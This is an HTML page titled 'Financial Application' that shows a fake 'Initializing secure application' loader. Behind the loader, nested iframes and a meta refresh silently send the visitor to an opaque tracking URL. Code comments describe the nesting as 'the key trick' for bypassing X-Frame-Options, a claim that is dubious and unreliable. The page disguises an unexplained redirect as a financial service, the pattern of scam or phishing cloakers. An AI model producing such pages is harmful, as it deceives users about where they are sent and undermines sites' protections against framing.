<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Financial Application</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow: hidden;
        }
        #container {
            width: 100%;
            height: 100vh;
            border: none;
        }
    </style>
</head>
<body>
    <!-- This is the key trick -->
    <iframe id="container" 
            srcdoc="
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Loading...</title>
                    <style>
                        body { margin: 0; padding: 50px; font-family: Arial; text-align: center; }
                        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto; }
                        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                    </style>
                    <script>
                        // Create a new iframe inside this iframe
                        const innerFrame = document.createElement('iframe');
                        innerFrame.style.width = '100%';
                        innerFrame.style.height = '100vh';
                        innerFrame.style.border = 'none';
                        innerFrame.style.position = 'fixed';
                        innerFrame.style.top = '0';
                        innerFrame.style.left = '0';
                        
                        // Use meta refresh to bypass X-Frame-Options
                        innerFrame.srcdoc = \`
                            <!DOCTYPE html>
                            <html>
                            <head>
                                <meta http-equiv='refresh' content='0;url=https://trkmcl.com/wy8odpg43k/xwndpp7qne'>
                            </head>
                            <body style='margin:0;padding:0;'>
                                <div style='text-align:center;padding-top:100px;'>
                                    <h3>Redirecting to application...</h3>
                                </div>
                            </body>
                            </html>
                        \`;
                        
                        document.body.appendChild(innerFrame);
                    <\/script>
                </head>
                <body>
                    <div style='padding-top:100px;'>
                        <div class='loader'></div>
                        <h3>Initializing secure application...</h3>
                    </div>
                </body>
                </html>
            "
            sandbox="allow-scripts allow-same-origin">
    </iframe>
</body>
</html>
